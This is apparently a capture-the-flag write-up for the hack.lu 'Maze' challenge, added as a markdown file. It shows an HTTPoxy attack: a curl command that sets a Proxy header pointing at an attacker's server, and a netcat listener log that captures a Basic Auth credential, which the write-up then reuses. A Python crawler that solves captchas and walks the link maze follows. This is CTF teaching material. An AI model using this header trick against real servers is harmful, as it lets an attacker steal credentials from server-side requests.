@@ -1,0 +1,184 @@
+# Writeup for the Maze's hack.lu chall
+
+**Keywords**: httpoxy, python3, Graph travelling algorithm, DFS
+
+**Category**: Prog/Misc
+
+**Points**: 207
+
+"Maze", we might have to do some graph travelling.. Sounds nice :)
+
+When we open the webpage we get this :
+
+```html
+<a href=/maze/t1xdtygdurka0vwo04vxovb9h4q91tw6/2zszieqld8ghxdm43nwi7t8wh93mxau4.php>Number 1 </a></br>
+<a href=/maze/zpk2os59yksq9uisgmpjjrh37kezpf4b/mr49u8rdqxhnx38khyv2hssiwc3kzf05.php>Number 2 </a></br>
+<a href=/maze/o25s1yq85a30u1hqoj6mpguy12o39f4i/bnbnylcs2td9a2ni5tgvhx56mgvgfgxw.php>Number 3 </a></br>
+<a href=/maze/j1dgu9uxkafajnvwo10w6j5bpwr42glm/iyfu5c4wf7w6ila0pfq4dlu7lf3rn8f1.php>Number 4 </a></br>
+</br>
+Please solve the link maze in order to get the Flag. </br>
+(You can find the source of this page <a href=code.php>here</a>)
+```
+
+Okay so  it looks like the challenge is to click on links until we find the good one (with the flag). Easier than expected ! :)
+
+So let's click on one link...
+
+```
+401 Unauthorized
+```
+
+Arg ! We are asked for a username/password for an HTTP Basic Auth. It says that it is not guessable so obsiously we tried to guess it, without any success :/
+
+We also tried to change the method with which we requested the server ([example vuln here](https://www.ekoparty.org/archivo/2012/eko8-HTExploit.pdf#10)) :
+
+```bash
+curl -X PLOP https://cthulhu.fluxfingers.net:1507/maze/t1xdtygdurka0vwo04vxovb9h4q91tw6/2zszieqld8ghxdm43nwi7t8wh93mxau4.php
+```
+
+No more success. Let's be a bit smarter and read all the HTML code source. We can see that the server source code is given, here it is:
+
+```php
+# Ubuntu trusty
+# Apache/2.4.7-1ubuntu4
+<?php
+require_once "lib/httpproxyconnection.php";
+echo queryURL("http://10.0.4.64/maze/");
+?>
+</br>
+Please solve the link maze in order to get the Flag. </br>
+(You can find the source of this page <a href=code.php>here</a>)
+```
+
+Okay so the server is just a proxy to a local VM. Let's look for known vulnerabilities for the given Apache + httpproxy. We found this : [HTTPOXY](https://httpoxy.org/)
+
+We won't explain the vulnerability here, you just have to know that for a long time a lot of webservers (Apache) and programming languages (PHP) interpreted the **Proxy** HTTP header as the real Proxy to use when doing server-side requests.
+
+This means that if we request:
+
+```bash
+curl -H "Proxy: myserver.com:1234" https://cthulhu.fluxfingers.net:1507/maze/t1xdtygdurka0vwo04vxovb9h4q91tw6/2zszieqld8ghxdm43nwi7t8wh93mxau4.php
+```
+
+then PHP, when requesting the local VM :
+
+```php
+queryURL("http://10.0.4.64/maze/");
+```
+
+will try to use **myserver.com:1234** as an HTTP Proxy. And of course, the server has the BasicAuth credentials :
+
+```bash
+# bash on myserver.com
+nc -lvp 1234
+listening on [any] 1234 ...
+149.13.33.84: inverse host lookup failed: Unknown host
+connect to [51.254.102.54] from (UNKNOWN) [149.13.33.84] 39123
+GET http://10.0.4.64/maze/ HTTP/1.1
+Authorization: Basic c3VwM3JzM2NyM3R1czNyOm4wYjBkeWM0bmd1M3NteXA0c3N3MHJk
+Host: 10.0.4.64
+Accept: */*
+Proxy-Connection: Keep-Alive
+```
+
+Here we are ! The server did try to connect to the local VM using our HTTP Proxy, and the server obviously sent the Basic auth along. Now we can access the links below :
+
+```bash
+curl https://cthulhu.fluxfingers.net:1507/maze/t1xdtygdurka0vwo04vxovb9h4q91tw6/2zszieqld8ghxdm43nwi7t8wh93mxau4.php -H "Authorization: Basic c3VwM3JzM2NyM3R1czNyOm4wYjBkeWM0bmd1M3NteXA0c3N3MHJk"
+```
+
+Here is the response :
+
+```html
+<form method="post">Please Solve the following capture to continue:<br>295076782 + 44722125 = 
+    <input type="text" name="result" value=""><br><br>
+    <input type="submit" value="Submit">
+</form>
+```
+
+A small captcha x) so cute ! Once solved here is the result :
+
+```html
+<a href=/maze/t1xdtygdurka0vwo04vxovb9h4q91tw6/3rvftt4iixtxpv5179zwzdu2fh87egh7.php>Number 1 </a></br>
+<a href=/maze/7v2lt3k6xsnuqywv67fxwbsdzxxzunco/j6n7ye84mmdrs5dr4wbiw6y9ttz1jpfv.php>Number 2 </a></br>
+<a href=/maze/ky0hvsovgdmw7og4t30xcfnmte7kcbcr/hn9wog3nmfivf1o6kbv16qypoillyn30.php>Number 3 </a></br>
+<a href=/maze/zpk2os59yksq9uisgmpjjrh37kezpf4b/ui0uohlw5t7j5avkcauskwzhviknzubs.php>Number 4 </a></br>
+```
+
+So out firsts intuitions were good :). We just have to go through all the links and find the one that contains the flag.
+Below is my code thant does it, but before I'll explain it quickly.
+
+The principle is quite easy : For each page in the list *urls_to_explore* :
++ Solve the captcha and get the links.
++ Put the links in the list *urls_to_explore* **IF** we didn't see them before AKA if the link is not in the dict *explored_urls*.
++ Add the current page's link to the dict *explored_urls* that tell us which links we already saw.
+
+```python
+import requests
+import re
+import sys
+
+url = "https://cthulhu.fluxfingers.net:1507"
+headers = {
+	"Authorization": "Basic c3VwM3JzM2NyM3R1czNyOm4wYjBkeWM0bmd1M3NteXA0c3N3MHJk"
+}
+
+explored_urls = {}
+
+urls_to_explore = [
+	"/maze/t1xdtygdurka0vwo04vxovb9h4q91tw6/2zszieqld8ghxdm43nwi7t8wh93mxau4.php",
+	"/maze/zpk2os59yksq9uisgmpjjrh37kezpf4b/mr49u8rdqxhnx38khyv2hssiwc3kzf05.php",
+	"/maze/o25s1yq85a30u1hqoj6mpguy12o39f4i/bnbnylcs2td9a2ni5tgvhx56mgvgfgxw.php",
+	"/maze/j1dgu9uxkafajnvwo10w6j5bpwr42glm/iyfu5c4wf7w6ila0pfq4dlu7lf3rn8f1.php"
+]
+
+def gotto(path):
+	res = requests.get(url + path, headers=headers)
+	try:
+		enigma = res.text.split("<br>")[1].split(" =")[0]
+		if re.match(r'^[\d* +-/]+$', enigma):
+			resultat = eval(enigma)
+		else:
+			print("Do not match! " + enigma)
+			print(res.text)
+			sys.exit(1)
+	except Exception as e:
+		if 'NOT THE FLAG' not in res.text:
+			print(res.text, file=sys.stderr) # the page didn't have the expected format -> FLAG ?? :)
+		return []
+	data = {
+		'result' : str(resultat)
+	}
+	res = requests.post(url + path, headers=headers, data=data)
+	try:
+		return list(map(lambda x : x.split(">")[0], res.text.split('<a href=')[1:]))
+	except Exception as e:
+		print(res.text, file=sys.stderr) # the page didn't have the expected format -> FLAG ?? :)
+		return []
+	
+
+while len(urls_to_explore) > 0:
+	path = urls_to_explore.pop()
+	if explored_urls.get(path):
+		continue
+	to_add = gotto(path)
+	for p in to_add:
+		if not explored_urls.get(p):
+			urls_to_explore.append(p)
+	print(urls_to_explore)
+	print(explored_urls)
+	print("\n------------------------------------------\n")
+	explored_urls[path] = True
+
+
+```
+
+That's all ! We just have to wait ;)
+
+```bash
+./maze.py > /tmp/output_maze # will only print the flag on stderr
+```
+
+And that's it :)
+
+
